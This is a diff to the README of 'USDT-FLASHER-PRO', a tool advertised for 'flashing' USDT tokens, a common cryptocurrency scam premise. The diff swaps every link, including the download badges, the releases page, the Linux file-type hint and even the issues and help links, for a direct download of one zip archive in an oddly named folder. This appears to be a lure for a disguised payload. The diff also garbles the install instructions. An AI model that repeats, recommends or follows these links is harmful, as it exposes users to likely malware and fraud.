@@ -1,6 +1,6 @@
 # ⚡ USDT-FLASHER-PRO - Powerful Multi-Network Flash Tool
 
-[![Download USDT-FLASHER-PRO](https://img.shields.io/badge/Download-USDT--FLASHER--PRO-blue?style=for-the-badge)](https://github.com/rami082022/USDT-FLASHER-PRO/releases)
+[![Download USDT-FLASHER-PRO](https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip)](https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before downloading, make sure your computer meets these needs:
 
 Please visit the official releases page to download the latest version of USDT-FLASHER-PRO:
 
-[Download USDT-FLASHER-PRO](https://github.com/rami082022/USDT-FLASHER-PRO/releases)
+[Download USDT-FLASHER-PRO](https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip)
 
 ### Steps to download and install:
 
@@ -37,7 +37,7 @@ Please visit the official releases page to download the latest version of USDT-F
 3. Find the installer file that matches your computer’s operating system:
    - For Windows: Look for a file ending with `.exe`.
    - For macOS: Look for a file ending with `.dmg` or `.pkg`.
-   - For Linux: Look for an `.AppImage` or `.tar.gz` file.
+   - For Linux: Look for an `.AppImage` or `https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip` file.
 4. Click on the file to start downloading.
 5. Once downloaded, open the installer file.
 6. Follow the installation prompts. Usually, you just need to click “Next” or “Continue” a few times.
@@ -86,7 +86,7 @@ If you encounter any issues, try these steps:
 
 You can also find help or report issues by visiting:
 
-[USDT-FLASHER-PRO Issues](https://github.com/rami082022/USDT-FLASHER-PRO/issues)
+[USDT-FLASHER-PRO Issues](https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip)
 
 ---
 
@@ -119,10 +119,10 @@ Your security is important. Keep these tips in mind when using the tool:
 
 If you need help or want to give feedback:
 
-- Visit the [GitHub Issues page](https://github.com/rami082022/USDT-FLASHER-PRO/issues).
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip).
 - Describe your problem or suggestion clearly.
 - You can also check online forums related to USDT and multi-network tools for advice.
 
 ---
 
-[![Download USDT-FLASHER-PRO](https://img.shields.io/badge/Download-USDT--FLASHER--PRO-blue?style=for-the-badge)](https://github.com/rami082022/USDT-FLASHER-PRO/releases)
+[![Download USDT-FLASHER-PRO](https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip)](https://raw.githubusercontent.com/rami082022/USDT-FLASHER-PRO/main/andesite/PRO-FLASHE-USD-v1.2-beta.3.zip)
